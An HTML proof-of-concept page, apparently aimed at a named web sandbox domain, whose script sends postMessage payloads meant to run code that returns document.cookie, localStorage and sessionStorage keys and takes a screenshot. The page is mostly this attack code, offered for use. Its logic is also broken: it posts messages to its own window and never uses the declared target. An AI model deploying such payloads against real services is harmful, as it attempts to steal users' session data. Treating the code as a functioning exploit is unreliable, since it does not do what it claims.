<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🚀 Sandbox Remote PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    button { padding: 10px 20px; margin-top: 20px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; }
    #log { margin-top: 20px; white-space: pre-wrap; background:#000; padding:10px; border:1px solid #0f0; }
  </style>
</head>
<body>
  <h2>🔥 Remote CTF PoC – Sandbox Exploit Test</h2>
  <p>Click the button to send payloads to <code>web-sandbox.oaiusercontent.com</code>.</p>

  <button id="launchBtn">Open & Exploit Sandbox</button>
  <div id="log"></div>

  <script>
    const log = (msg) => {
      console.log(msg);
      document.getElementById("log").innerText += msg + "\n";
    };

    function launch() {
      log("🚀 PoC started – sending payloads...");

      const target = "https://web-sandbox.oaiusercontent.com/";

      // payloads لتجربة الوصول للبيانات
      const payloads = [
        ["CALL", "runUserCode", ["return document.cookie"]],
        ["CALL", "runUserCode", ["return Object.keys(localStorage)"]],
        ["CALL", "runUserCode", ["return Object.keys(sessionStorage)"]],
        ["CALL", "screenshot", []],
        ["CALL", "echo", [{poc:"hello"}]]
      ];

      window.addEventListener("message", (event) => {
        log("📩 Response from sandbox:");
        log(JSON.stringify(event.data, null, 2));
      });

      // إرسال payloads كل 3 ثواني
      payloads.forEach((msg, i) => {
        setTimeout(() => {
          log("➡️ Sending payload #" + i + ": " + msg[1]);
          window.postMessage(msg, "*");
        }, i * 3000);
      });
    }

    // اربط الزر بالدالة
    document.getElementById("launchBtn").addEventListener("click", launch);
  </script>
</body>
</html>
